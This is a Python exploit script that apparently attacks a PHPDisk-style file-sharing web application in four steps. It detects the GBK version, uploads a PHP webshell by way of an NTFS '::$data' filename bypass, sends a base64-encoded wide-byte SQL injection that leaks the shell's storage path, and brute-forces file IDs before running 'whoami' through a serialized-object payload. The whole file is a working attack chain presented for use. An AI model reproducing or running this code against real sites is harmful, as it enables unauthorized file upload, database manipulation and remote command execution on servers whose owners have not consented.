#coding:utf-8
#author:leo
#date:2019.8.8

import urllib
import requests
import re
import threading
domain='http://test.test.com'

headers={
	'Accept': 'text/*',
	'User-Agent': 'Shockwave Flash',
	'Host': domain[7:],
	'Pragma': 'no-cache'
	}

def detect():
	global domain
	global headers
	url=domain+'/AjaX.php'
	#print(url)
	code = requests.get(url,headers=headers).status_code
	#print(code)
	try:
		content = requests.get(domain,headers=headers).content.decode('gbk')
	except Exception:
		print('not suit,only suit for the gbk version and must be run in the windows')
		return False
	#print(content)
	if 'gbk' in content:
		if code == 200:
			print('maybe this site can be hacked')
			return True
	print('not suit')
	print(code,content)
	return False

def upload():
	global domain
	url=domain+'/mydisk.php?item=upload&is_public=0&cate_id=0&subcate_id=0&folder_node=0&folder_id=-1&uid=1'
	files={
	'Filename':(None,'shell.jpg'),
	'desc11':(None,'desc112'),
	'task':(None,'doupload'),
	'file_id':(None,'0'),
	'upload_file':('shell.php::$data',open(r'C:\Users\SN\Desktop\shell.php','r'),'application/octet-stream'),
	'Upload':(None,'Submit Query')
	}
	requests.post(url,files=files)
	print('upload webshell success')
def sql():
	global domain
	global headers
	url=domain+'/ajax.php?action=uploadCloud'
	data={'data':'YToyOntzOjc6ImZpbGVfaWQiO3M6NDoiMjMzMyI7czo5OiJmaWxlX25hbWUiO3M6MTQ4OiLpjKYnLGBpbl9zaGFyZWA9MSxgZmlsZV9kZXNjcmlwdGlvbmA9KHNlbGVjdCB4LmEgZnJvbSAoc2VsZWN0IGNvbmNhdChmaWxlX3N0b3JlX3BhdGgsZmlsZV9yZWFsX25hbWUpYSBmcm9tIHBkX2ZpbGVzIHdoZXJlIGZpbGVfbmFtZT0weDczNjg2NTZjNmMpeCkjIjt9'}
	requests.post(url,data=data,headers=headers)

def getshellpath():
	for i in range(8699,1000000):
		url2=domain+'/viewfile.php?file_id='+str(i)
		print(url2)
		try:
			content=requests.get(url2).content.decode('gbk')
		#print(content)
		except Exception:
			pass
		try:
			path=re.findall(r'<br />20(.*?)</div>',content)[0]
			break
		except Exception:
			pass

	path= domain+'/filestores/20'+path+'.php'
	print('[webshell] '+path)
	url3=path + '?id=O:3:%22foo%22:1:{s:4:%22data%22;s:17:%22system(%27whoami%27);%22;}'
	res=requests.get(url3,headers=headers).content.decode('gbk')
	print('cmd > whoami'+res)

if __name__ == '__main__':
	if detect():
		upload()
		sql()
		getshellpath()



